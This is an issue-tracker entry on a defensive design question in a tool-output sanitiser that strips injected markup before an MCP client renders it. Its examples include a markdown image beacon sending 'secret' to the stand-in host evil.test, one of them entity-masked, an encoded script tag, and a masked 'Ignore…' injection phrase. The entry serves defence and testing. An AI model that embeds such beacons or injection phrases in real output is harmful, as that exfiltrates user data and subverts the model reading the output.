---
id: 004
title: "The entity-decode stage serves two channels with opposite requirements"
status: open
severity: P2
tags: [security, design-question, class-fix]
class-id: unescaped-sink
source: /sixees-workflow:work review round on the defendText branch (security-sentinel)
created: 2026-09-02
---

# The entity-decode stage serves two channels with opposite requirements

## Problem

`stripBlocksFixedPoint` decodes numeric HTML entities so the strip can see
`&#x3c;script&#x3e;`. The decode's output is what gets **returned**, which makes
it additive rather than subtractive, and two channels need opposite things:

- **A channel whose consumer does NOT decode** (response headers, cURL stderr)
  must not have entities decoded — the decode manufactures live markup from
  inert bytes the origin sent as text. `LESSONS.md` RC-3.
- **A channel whose consumer DOES decode** (the post-processor wrap: an MCP
  client renders tool text as markdown, and CommonMark decodes entity references
  in link destinations) needs the decode, or an entity-masked beacon survives.

Today this is a per-caller `decodeEntities` flag, so every caller picks one
failure. Measured on the wrap with the flag off:

```
![x](&#104;ttps://evil.test/?d=secret)     survives
![x](https://evil.test/?d=secret)          stripped
```

## Why the obvious fix does not work

**Decode into a scratch copy, return the undecoded text.** Built and reverted;
the attempt is preserved in the session scratchpad. It founders on the commit
rule — what counts as the decode having revealed something:

- **Commit only when markup was stripped.** Then an entity-masked injection
  phrase never reaches Step 5's detector and an entity-masked `&#x200B;` never
  reaches the sanitiser. Eight existing guards fail, correctly.
- **Commit when detection fires.** RC-3 returns exactly: the header case decodes
  an inert `&#x49;&#x67;nore…` into a live phrase in returned text.

Recorded as `LESSONS.md` RC-12.

## What has already landed

A JSON document is never entity-decoded, whatever the origin declared
(`processor.ts::defendText`). That closes the corruption half — one mislabelled
`Content-Type` turned `{"q":"a &#x22;b&#x22;"}` into `{"q":"a "b"}`, which no
longer parses and which `save_to_file` persisted. It does not close the beacon
half above.

## Directions worth costing

1. **Separate the detection view from the returned text.** Detection is a
   logging signal and never alters output, so it can run on the decoded scratch
   copy unconditionally with no RC-3 exposure. That recovers the log signal;
   it does not by itself decide what the strip returns.
2. **Neutralise rather than decode.** Where a decoded copy reveals markup the
   plain copy did not, remove the numeric entities from the original instead of
   decoding them — `&#x3c;script&#x3e;evil` becomes `scriptevil`, inert, with no
   live markup authored. Needs a new entity-removal primitive on the hot path.
3. **Ask what each consumer actually does.** The trade only exists because the
   answer is assumed. If the MCP client's rendering of tool text is knowable,
   one of the two channels stops needing the compromise.

## Acceptance criteria

- [ ] An entity-encoded beacon reaching the wrap is stripped.
- [ ] An inert entity-encoded phrase in header text is returned undecoded
      (RC-3's guard still passes).
- [ ] A JSON document round-trips byte-identical through every PERSISTED
      channel. Not every channel: the wrap strips beacons inside JSON string
      values by design (RC-10), and since RC-16 it re-serialises the document
      to defend each value separately — so an inline copy is deliberately not
      byte-identical, and a criterion demanding that it be would fail against
      correct behaviour.
- [ ] The `decodeEntities` per-caller flag is gone, or `ARCHITECTURE.md`
      invariant 1a states why it must remain.
